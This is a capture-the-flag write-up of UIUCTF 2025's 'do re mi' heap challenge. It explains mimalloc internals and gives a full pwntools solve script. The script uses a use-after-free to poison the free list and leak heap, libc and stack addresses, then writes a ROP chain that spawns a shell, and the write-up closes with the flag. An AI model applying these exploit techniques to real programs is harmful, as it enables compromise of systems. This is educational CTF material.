---
title: "do re mi - UIUCTF 2025"
category: "pwn"
subcategory: "heap"
type: "writeup"
tags: ["mimalloc", "pwn", "heap", "unsorted-bin", "use-after-free", "double-free", "safe-linking", "malloc-hook", "fsop", "aslr", "pwndbg", "proof-of-work", "uiuctf", "uiuctf-2025", "2025", "ctf-writeup"]
summary: "Â· 2025-07-28 Â·  #writeup  #pwn  #uiuctf2025"
source:
  name: "CTFtime writeup #40356"
  url: "https://ctftime.org/writeup/40356"
original_source: "https://justinapplegate.me/2025/uiuctf-doremi/"
ctf:
  name: "UIUCTF 2025"
  year: 2025
  challenge: "do re mi"
---

## Metadata

- **CTF:** UIUCTF 2025
- **Task:** do re mi
- **Author team:** BYU Cyberia
- **CTFtime tags:** mimalloc, pwn, heap
- **CTFtime:** <https://ctftime.org/writeup/40356>
- **Original writeup:** <https://justinapplegate.me/2025/uiuctf-doremi/>

---
# Writeup - Do Re Mi (UIUCTF 2025)

Â· 2025-07-28 Â· [ #writeup](https://justinapplegate.me/tags/writeup/) [ #pwn](https://justinapplegate.me/tags/pwn/) [ #uiuctf2025](https://justinapplegate.me/tags/uiuctf2025/)

* * *

# UIUCTF 2025 - Do Re Mi Writeup

## Description

```
    1  
    2  
    3  
    4  
    5  
    6  
```

| 

```
    The musl allocator was too slow, so we went to a company known for ð Blazing Fast ð  
    software, Microsoft!  
      
    `ncat --ssl doremi.chal.uiuc.tf 1337`  
      
    author: Surg  
```  
  
---|---  
  
## Writeup

This was a pretty cool pwn challenge that involved heap exploitation on an x86_64 binary using [muslâs libc](https://musl.libc.org/) and Microsoftâs [mimalloc allocator](https://github.com/microsoft/mimalloc). 

### Introduction

The provided [handout.tar.gz](https://justinapplegate.me/static/uiuctf-doremi/handout.tar.gz) file included a Dockerfile, `chal` binary, `chal.c` source code, and compiled `libmimalloc.so.2.2` library. The Dockerfile included the lines:

```
    1  
    2  
    3  
    4  
    5  
    6  
    7  
    8  
    9  
    10  
    11  
    12  
    13  
    14  
    15  
    16  
    17  
    18  
    19  
```

| 

```
    # ...  
      
    RUN git clone https://github.com/microsoft/mimalloc.git /mimalloc -b v2.2.4 --depth=1  
      
    RUN mkdir -p /mimalloc/build  
    RUN cd /mimalloc/build && cmake .. && make  
      
    # ...  
      
    FROM alpine AS chroot  
      
    RUN apk add bash  
      
    # ...  
      
    CMD kctf_setup && \  
        kctf_drop_privs \  
        socat TCP-LISTEN:1337,reuseaddr,fork \  
            EXEC:'kctf_pow nsjail --config /home/user/nsjail.cfg --cwd /home/user -- /usr/bin/env LD_PRELOAD=/home/user/libmimalloc.so.2.2 /home/user/chal'  
```  
  
---|---  
  
We can see mimalloc v2.2.4 was compiled from source using the default options, and was used as the allocator for the challenge using the `LD_PRELOAD` hook. We can also see that the chroot environment for the hosted problem uses Alpina with musl libc and bash installed (weâll cover its importance later).

The C source code was pretty simple and a common CTF-style challenge, âheap notesâ. It gives you the ability to allocate up to 16 notes (chunks of size 128), free arbitrary notes, read from the notes, and write to the notes. While the chunk/read/write size was restricted to 128 bytes, the pointer to notes were not set to `NULL` after freeing, leading to easy UAF read/write and double free.

```
    1  
    2  
    3  
    4  
    5  
    6  
    7  
    8  
    9  
    10  
    11  
    12  
    13  
    14  
    15  
    16  
    17  
    18  
    19  
    20  
    21  
    22  
    23  
    24  
    25  
    26  
    27  
    28  
```

| 

```
    void create() {  
        unsigned int number = get_index();  
        notes[number] = malloc(128);  
        printf("Done!\n");  
        return;  
    }  
      
    void look() {  
        unsigned int number = get_index();  
        write(STDOUT_FILENO, notes[number], NOTE_SIZE-1);  
        printf("\n");  
        printf("Done!\n");  
    }  
      
    void delete() {  
       unsigned int number = get_index();  
       free(notes[number]);  
       printf("Done!\n");  
       return;   
    }  
      
    void update() {  
        unsigned int number = get_index();  
        printf("Content? (127 max): ");  
        read(STDIN_FILENO, notes[number], NOTE_SIZE-1);  
        printf("Done!\n");  
        return;  
    }  
```  
  
---|---  
  
### Mimalloc

Mimalloc is a heap implementation created by Microsoft, designed to be small and fast. Itâs open source and [can be viewed on GitHub](https://github.com/microsoft/mimalloc), plus I also used the obligatory [Chinese blogpost](https://bbs.kanxue.com/thread-278279.htm) to learn more about the internal workings. It has a secure mode than can be enabled during compilation using the `-DMI_SECURE=ON` flag. Secure mode provides:

  * Guard pages
  * Encoded free list pointers
  * Double free detection
  * Random allocation order
  * And more


However, secure mode was **not set** for this challenge and thus none of the mitigations were enabled. Also, since weâre not using the glibc ptmalloc2 implementation, all those mitigations like safe linking/unlinking donât exist here (making exploitation a lot easier).

Some other major differences between mimalloc and ptmalloc2 is:

  * Mimalloc doesnât have inline metadata (like ptmalloc2âs 0x10-byte header with information like chunk size)
  * A page is allocated for each chunk size
    * Whenever the first chunk of a given size is allocated, an entire page is set aside and split up into chunks of that same size. 
    * As an example, when the first chunk of size 128 (0x80) bytes is allocated, a page is split into 32 chunks of that size and the first one is returned.
  * Since pages are pre-split into chunks, all remaining chunks are immediately placed into the free list. 
    * Going along with 128-byte chunks, when the first one is allocated (and returned to the user), the remaining 31 chunks are then immediately placed into the free list (even though theyâve never been allocated chunks before).
  * If a chunk is freed, it goes to a âlocal free listâ instead of the âfree listâ. Allocated chunks are pulled from the free list before the local free list.
    * For exploitation purposes, that means if an attacker frees a chunk and then allocates a chunk of the same size, they may not get the same one back if thereâs chunks in the regular free list.
  * When debugging a binary using GDB, using a command like `info proc mappings` or `vmmap` will show memory segments. The heap chunks allocated for this challenge were placed in a new, separate RW mapping, **not in the normal`[heap]` mapping youâd see**.
    * This also means any debugger-specific commands like `heap chunks` wonât work here, all inspection has to be done manually.
  * Actual chunk contents are placed in the heap memory segment starting 0x10000 bytes after the beginning.
    * As an example, if the mimalloc memory segment started at address 0x286e8000000, the first chunk would be allocated at 0x286e8010000.

![](https://justinapplegate.me/static/uiuctf-doremi/vmmap.png)

Iâm sure thereâs a lot of other internal particularities or complexities that Iâm skipping or generalizing, but with our fixed size chunks and lack of security mitigations, this is really all I needed to know to exploit it.

### Exploitation

Just like ptmalloc2, the first 8 bytes in a freed chunk contain a pointer to the next chunk in the free list, allowing for easy heap leaks and fake chunks. As with any heap challenge, the first step is to get leaks for data sections outside of the heap to use gadgets/data/etc. to get RCE.

In ptmalloc2, there are no non-heap pointers in the heap unless there are chunks in the small bins, large bins, or unsorted bin. Luckily for us, mimalloc has a number of pointers outside of the heap from the getgo.

![](https://justinapplegate.me/static/uiuctf-doremi/p2p.png)

Using pwndbgâs `p2p` command, we were able to locate pointers inside of the heap and identify a few that went to the `libmimalloc.so.2.2` (or surrounding) memory segments, notably at offsets 0x28, 0x118, and 0x1c0. Itâs important to note that Linux x86_64 ASLR doesnât separate different library segments; this means that if you get a leaked address into one library file, the other library files start at a predictable offset. Therefore, by leaking a `libmimalloc` address, we can also recover the libc base address.

I created some helper functions to simplify chunk interactions:

```
    1  
    2  
    3  
    4  
    5  
    6  
    7  
    8  
    9  
    10  
    11  
    12  
    13  
    14  
    15  
    16  
    17  
    18  
    19  
    20  
    21  
    22  
    23  
    24  
    25  
    26  
    27  
    28  
    29  
    30  
    31  
    32  
    33  
    34  
```

| 

```
    def create(idx: int):  
        if idx < 0 or idx > 15:  
            raise ValueError("Index must be between 0 and 15")  
      
        p.sendline(b'1')                # create  
        p.sendline(str(idx).encode())   # idx  
        p.recvuntil(b'YAHNC> ')  
      
    def read(idx: int) -> bytes:  
        if idx < 0 or idx > 15:  
            raise ValueError("Index must be between 0 and 15")  
          
        p.sendline(b'3')                # read  
        p.sendline(str(idx).encode())   # idx  
        return p.recvuntil(b'YAHNC> ')[18:-14]  
      
    def write(idx: int, data: bytes, get_text=True):  
        if idx < 0 or idx > 15:  
            raise ValueError("Index must be between 0 and 15")  
          
        p.sendline(b'4')                # write  
        p.sendline(str(idx).encode())   # idx  
        p.sendline(data)                # data  
        if get_text:  
            p.recvuntil(b'YAHNC> ')  
      
    def free(idx: int):  
        if idx < 0 or idx > 15:  
            raise ValueError("Index must be between 0 and 15")  
          
        p.sendline(b'2')                # free  
        p.sendline(str(idx).encode())   # idx  
        p.recvuntil(b'YAHNC> ')  
```  
  
---|---  
  
To get around the âfree listâ vs âlocal free listâ shenanigans, I allocated 32 chunks at the start (saving 6 of them in the notes, letting the rest get lost in the void) to empty the âfree listâ. I then freed two of the chunks and read the contents of the second one to leak a heap address and recover the heap base address.

```
    1  
    2  
    3  
    4  
    5  
    6  
    7  
    8  
    9  
    10  
    11  
    12  
    13  
    14  
    15  
    16  
    17  
    18  
    19  
    20  
    21  
    22  
    23  
    24  
    25  
    26  
```

| 

```
    p.recvuntil(b'YAHNC> ')  
      
    # allocate (and keep) some chunks  
    create(7)  
    create(8)  
    create(4)  
    create(5)  
      
    # have a bunch of chunks "in the void"  
    for _ in range(26):  
        create(15)  
      
      
      
    ### GET HEAP LEAK ###  
    # create 2 chunks  
    create(0)  
    create(1)  
      
    # free both chunks  
    free(0)  
    free(1)  
      
    # get leak  
    heap_base = u64(read(1)[:8]) - 0x10f80  
    print(f"Heap base: {hex(heap_base)}")  
```  
  
---|---  
  
Then, to recover a library leak, I used my Use After Free write to modify the pointer to the second freed chunk to be at `heap_base + 0x1b8`. This way, I could allocate two more chunks, and the second one would be our fake chunk at address 0x1b8. Reading from this chunk would give me the `libmimalloc` address I identified earlier. Note that I chose the offset `0x1b8` instead of `0x1c0` because `0x1b8` was `NULL`, and I wanted to make sure that the free list thought it was empty again and not try to treat the address at `0x1c0` as a ânext pointerâ.

```
    1  
    2  
    3  
    4  
    5  
    6  
    7  
    8  
    9  
    10  
    11  
    12  
    13  
    14  
    15  
    16  
    17  
    18  
```

| 

```
    payload = flat(  
        p64(heap_base + 0x1b8),  
        p64(0),  
      
        b'/bin/bash\x00',  
        b'\x00'*0x64  
    )  
    write(1, payload)  
      
    # create 2 chunks  
    create(2)  
    create(3)  
      
    # read new chunks  
    lib_leak = u64(read(3)[8:16])  
    print(f'Lib leak: {hex(lib_leak)}')  
    libc_base = lib_leak + 0x7f00  
    print(f'Libc base: {hex(libc_base)}')  
```  
  
---|---  
  
Youâll also notice I put a `'/bin/bash\x00'` string inside the padding - this was used later.

At this point, I needed to decide what my RCE vector was going to be. In normal glibc ptmalloc2, techniques like FSOP, `__malloc_hook`, or libc GOT overwrites are common. However, all loaded ELFs had full RELRO, and since weâre using musl, techniques like FSOP or writable hooks would require investigation. I therefore decided to leak a stack address and write my own ROP chain onto the stack, using gadgets from libc.

Using the `p2p` command again, I found that the musl libc had a pointer to the stack at a predictable offset.

![](https://justinapplegate.me/static/uiuctf-doremi/p2p2.png)

By creating another fake chunk (through UAF write) near this address, I was able to leak the stack address (through an uninitialized read after reallocation). Note I again choose an address actually 0x18 bytes before the leak since it was `NULL` at that address and I didnât want reallocation errors.

```
    1  
    2  
    3  
    4  
    5  
    6  
    7  
    8  
    9  
    10  
    11  
    12  
    13  
    14  
    15  
    16  
    17  
```

| 

```
    free(7)  
    free(8)  
      
    # UAF - overwrite chunk 8 with libc address  
    payload = flat(  
        p64(libc_base + 0xa2870),  
        b'\x00'*0x76  
    )  
    write(8, payload)  
      
    # create 2 chunks  
    create(7)  
    create(8)  
      
    # read chunk 8 to get stack leak  
    stack_leak = u64(read(8)[8*3:8*4])  
    print(f'Stack leak: {hex(stack_leak)}')  
```  
  
---|---  
  
The last step was to actually write a ROP chain to the stack that would give me RCE. I eventually decided on a ret2syscall approach that would call `execve('/bin/bash', 0, 0)` by setting each register then `syscall`. I chose this approach because the musl library was stripped and I couldnât find the `system()` function. I also chose `/bin/bash` over `/bin/sh` because the container used BusyBox. BusyBox packages several commandline options into one single binary, and just symlinks those commands in `/bin` to the `/bin/busybox` executable. This executable would then identify `args[0]` to know which command the user ACTUALLY wanted to run. 

However, exploit developers often just do `execve('/bin/sh', 0, 0)` since they donât want to create structs for arguments and the environment. Unfortunately, with BusyBox, making that function call would cause the `/bin/busybox` executable to exit early since the lack of arguments caused it to not know which executable to really run. I believe this is why `bash` was installed in the target container (to make it simpler for us, although we easily couldâve done it). That is also why I included `/bin/bash\x00` at a known address on the heap earlier.

The `main()` function of the target binary never returned (only `exit()`), so I decided to overwrite the return address for the `read()` function. Since our chunk size was 0x80 bytes, that meant we could write 0x80 bytes in a single go, more than enough for a simple ROP chain. Through GDB debugging, I determined that the offset from the stack leak to the `read()` return value was 0xe0 bytes on my machine. Since this address can change based on environmental variables, I decided to use a retsled (ROP version of nopsled) and include as many `ret` gadgets at the beginning as I could before my real ROP chain. This way, even if remote had more/less environmental variables (which it did), as long as the return value for `read()` was within the retsled, the real ROP chain would still be triggered just fine.

```
    1  
    2  
    3  
    4  
    5  
    6  
    7  
    8  
    9  
    10  
    11  
    12  
    13  
    14  
    15  
    16  
    17  
    18  
    19  
    20  
    21  
    22  
    23  
    24  
    25  
    26  
```

| 

```
    payload = flat(  
        p64(stack_leak-0xe0),  
        b'\x00'*0x76  
    )  
    write(5, payload)  
      
    # create 2 chunks  
    create(4)  
    create(5)  
      
    # now, chunk 5 points to the stack  
    payload = flat(  
        p64(libc_base + 0x14126)*8,         # retsled (to account for envar stack differences)  
      
        p64(libc_base + 0x3d339),           # pop rax, ret  
        p64(0x3b),                          # syscall number for execve  
      
        p64(libc_base + 0x14413),           # pop rdi, ret  
        p64(heap_base + 0x11010),           # pointer to "/bin/bash"  
      
        p64(libc_base + 0x42774),           # pop rdx, ret  
        p64(0),                             # rdx = NULL  
      
        p64(libc_base + 0x4370d),           # xor esi, esi; syscall;  
    )  
    write(5, payload, get_text=False)  
```  
  
---|---  
  
### Final Exploit

Hereâs my [final solve script](https://justinapplegate.me/static/uiuctf-doremi/solve.py):

```
    1  
    2  
    3  
    4  
    5  
    6  
    7  
    8  
    9  
    10  
    11  
    12  
    13  
    14  
    15  
    16  
    17  
    18  
    19  
    20  
    21  
    22  
    23  
    24  
    25  
    26  
    27  
    28  
    29  
    30  
    31  
    32  
    33  
    34  
    35  
    36  
    37  
    38  
    39  
    40  
    41  
    42  
    43  
    44  
    45  
    46  
    47  
    48  
    49  
    50  
    51  
    52  
    53  
    54  
    55  
    56  
    57  
    58  
    59  
    60  
    61  
    62  
    63  
    64  
    65  
    66  
    67  
    68  
    69  
    70  
    71  
    72  
    73  
    74  
    75  
    76  
    77  
    78  
    79  
    80  
    81  
    82  
    83  
    84  
    85  
    86  
    87  
    88  
    89  
    90  
    91  
    92  
    93  
    94  
    95  
    96  
    97  
    98  
    99  
    100  
    101  
    102  
    103  
    104  
    105  
    106  
    107  
    108  
    109  
    110  
    111  
    112  
    113  
    114  
    115  
    116  
    117  
    118  
    119  
    120  
    121  
    122  
    123  
    124  
    125  
    126  
    127  
    128  
    129  
    130  
    131  
    132  
    133  
    134  
    135  
    136  
    137  
    138  
    139  
    140  
    141  
    142  
    143  
    144  
    145  
    146  
    147  
    148  
    149  
    150  
    151  
    152  
    153  
    154  
    155  
    156  
    157  
    158  
    159  
    160  
    161  
    162  
    163  
    164  
    165  
    166  
    167  
    168  
```

| 

```
    from pwn import *  
      
      
    binary = "./chal"  
    elf = context.binary = ELF(binary, checksec=False)  
      
    gs = """  
    break malloc  
    continue  
    """  
      
    if args.REMOTE:  
        p = remote("doremi.chal.uiuc.tf", 1337, ssl=True)  
    elif args.REMOTE2:  
        p = remote("localhost", 1337)  
    elif args.GDB:  
        context.terminal = ["tmux", "splitw", "-h", "-l", "65%"]  
        p = gdb.debug(binary, gdbscript=gs, env={"LD_PRELOAD": "./libmimalloc.so.2.2"})  
    else:  
        p = elf.process(env={"LD_PRELOAD": "./libmimalloc.so.2.2"})  
      
      
      
    ### HELPER FUNCTIONS ###  
    def create(idx: int):  
        if idx < 0 or idx > 15:  
            raise ValueError("Index must be between 0 and 15")  
      
        p.sendline(b'1')                # create  
        p.sendline(str(idx).encode())   # idx  
        p.recvuntil(b'YAHNC> ')  
      
    def read(idx: int) -> bytes:  
        if idx < 0 or idx > 15:  
            raise ValueError("Index must be between 0 and 15")  
          
        p.sendline(b'3')                # read  
        p.sendline(str(idx).encode())   # idx  
        return p.recvuntil(b'YAHNC> ')[18:-14]  
      
    def write(idx: int, data: bytes, get_text=True):  
        if idx < 0 or idx > 15:  
            raise ValueError("Index must be between 0 and 15")  
          
        p.sendline(b'4')                # write  
        p.sendline(str(idx).encode())   # idx  
        p.sendline(data)                # data  
        if get_text:  
            p.recvuntil(b'YAHNC> ')  
      
    def free(idx: int):  
        if idx < 0 or idx > 15:  
            raise ValueError("Index must be between 0 and 15")  
          
        p.sendline(b'2')                # free  
        p.sendline(str(idx).encode())   # idx  
        p.recvuntil(b'YAHNC> ')  
      
      
      
    ### SETUP ###  
    p.recvuntil(b'YAHNC> ')  
      
    # allocate (and keep) some chunks  
    create(7)  
    create(8)  
    create(4)  
    create(5)  
      
    # have a bunch of chunks "in the void"  
    for _ in range(26):  
        create(15)  
      
      
      
    ### GET HEAP LEAK ###  
    # create 2 chunks  
    create(0)  
    create(1)  
      
    # free both chunks  
    free(0)  
    free(1)  
      
    # get leak  
    heap_base = u64(read(1)[:8]) - 0x10f80  
    print(f"Heap base: {hex(heap_base)}")  
      
      
      
    ### GET LIBC LEAK ###  
    # UAF - overwrite chunk 1 with some earlier metadata to get library leak  
    payload = flat(  
        p64(heap_base + 0x1b8),  
        p64(0),  
      
        b'/bin/bash\x00',  
        b'\x00'*0x64  
    )  
    write(1, payload)  
      
    # create 2 chunks  
    create(2)  
    create(3)  
      
    # read new chunks  
    lib_leak = u64(read(3)[8:16])  
    print(f'Lib leak: {hex(lib_leak)}')  
    libc_base = lib_leak + 0x7f00  
    print(f'Libc base: {hex(libc_base)}')  
      
      
      
    ### GET STACK LEAK ###  
    free(7)  
    free(8)  
      
    # UAF - overwrite chunk 8 with libc address  
    payload = flat(  
        p64(libc_base + 0xa2870),  
        b'\x00'*0x76  
    )  
    write(8, payload)  
      
    # create 2 chunks  
    create(7)  
    create(8)  
      
    # read chunk 8 to get stack leak  
    stack_leak = u64(read(8)[8*3:8*4])  
    print(f'Stack leak: {hex(stack_leak)}')  
      
      
      
    ### WRITE ROP CHAIN ###  
    free(4)  
    free(5)  
      
    # UAF - overwrite chunk 5 with stack address  
    payload = flat(  
        p64(stack_leak-0xe0),  
        b'\x00'*0x76  
    )  
    write(5, payload)  
      
    # create 2 chunks  
    create(4)  
    create(5)  
      
    # now, chunk 5 points to the stack  
    payload = flat(  
        p64(libc_base + 0x14126)*8,         # retsled (to account for envar stack differences)  
      
        p64(libc_base + 0x3d339),           # pop rax, ret  
        p64(0x3b),                          # syscall number for execve  
      
        p64(libc_base + 0x14413),           # pop rdi, ret  
        p64(heap_base + 0x11010),           # pointer to "/bin/bash"  
      
        p64(libc_base + 0x42774),           # pop rdx, ret  
        p64(0),                             # rdx = NULL  
      
        p64(libc_base + 0x4370d),           # xor esi, esi; syscall;  
    )  
    write(5, payload, get_text=False)  
      
      
    p.interactive()  
```  
  
---|---  
![](https://justinapplegate.me/static/uiuctf-doremi/solve.png)

**Flag:** `uiuctf{does_anyone_still_like_doing_these_?_have_we_not_conquered_every_land_?}`
